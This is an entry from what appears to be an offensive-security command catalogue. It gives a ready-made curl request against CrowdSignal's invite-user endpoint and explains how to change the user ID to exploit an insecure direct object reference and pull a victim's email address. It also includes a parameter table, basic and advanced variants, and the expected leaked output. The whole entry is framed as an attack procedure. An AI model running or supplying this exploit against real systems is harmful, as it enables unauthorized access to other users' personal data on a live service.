---
id: 13847e1d-850a-4299-93d8-bc2b3a8901ca
name: curl-get-invite-user
type: command
executor: bash
data: >-
  curl -H "Cookie: session=your_session_cookie"
  "https://app.crowdsignal.com/users/invite-user.php?id=19920465&popup=1"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.651Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - web
  - recon
verified: false
validated: true
submitted: true
---

# curl-get-invite-user

## Command

```bash
curl -H "Cookie: session=your_session_cookie" "https://app.crowdsignal.com/users/invite-user.php?id=19920465&popup=1"
```

## Description

This command sends a GET request to the CrowdSignal user invitation endpoint with a manipulated ID to exploit IDOR and retrieve victim email. Use after authentication to include session cookie.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: session=..."` | Authentication session cookie from login | Yes |
| `id=19920465` | Target user ID (sequential, replace with victim ID) | Yes |
| `&popup=1` | Parameter to load popup interface | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: session=abc123" "https://app.crowdsignal.com/users/invite-user.php?id=19920465&popup=1"
```

### Advanced Usage

```bash
curl -v -H "Cookie: session=abc123" -H "User-Agent: Mozilla/5.0" "https://app.crowdsignal.com/users/invite-user.php?id=19920465&popup=1" > response.html
```

## Expected Output

HTML response containing the invitation form with the victim's email address pre-filled, e.g., <input type="email" value="victim@example.com">. No auth errors if successful.

## Related

- [[Related Procedure: Exploit-IDOR-to-Retrieve-Victim-Email]]
